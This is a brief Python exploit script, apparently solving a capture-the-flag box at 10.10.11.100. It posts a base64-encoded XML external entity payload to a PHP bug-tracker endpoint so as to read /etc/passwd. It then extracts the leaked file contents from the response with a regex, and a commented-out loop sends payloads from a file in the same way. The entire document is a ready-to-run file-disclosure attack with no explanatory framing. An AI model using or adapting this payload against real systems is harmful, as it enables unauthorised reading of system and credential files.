# import requests
#
# with open('payloads.txt') as f:
#     lines = f.readlines()
#
# f.close()
#
# for payload in lines:
#     url = "http://10.10.11.100:80/tracker_diRbPr00f314.php"
#     headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
#     r = requests.post(url, headers, data = {"data":"PCFET0NUWVBFIGZvbyBbIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI%2BIF0%2BCgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU%2BJnh4ZTs8L3RpdGxlPgoJCTxjd2U%2BMTwvY3dlPgoJCTxjdnNzPjE8L2N2c3M%2BCgkJPHJld2FyZD4xPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B"})
#     print(r.text)
import requests
import re

burp0_url = "http://10.10.11.100:80/tracker_diRbPr00f314.php"
burp0_headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
payload = "PCFET0NUWVBFIGZvbyBbIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI+IF0+CgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU+Jnh4ZTs8L3RpdGxlPgoJCTxjd2U+MTwvY3dlPgoJCTxjdnNzPjE8L2N2c3M+CgkJPHJld2FyZD4xPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+"
burp0_data = {"data": payload}
r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
print(re.search('Title:</td>\n    <td>(.+?)</td>', r.text, flags = re.DOTALL).group(1))
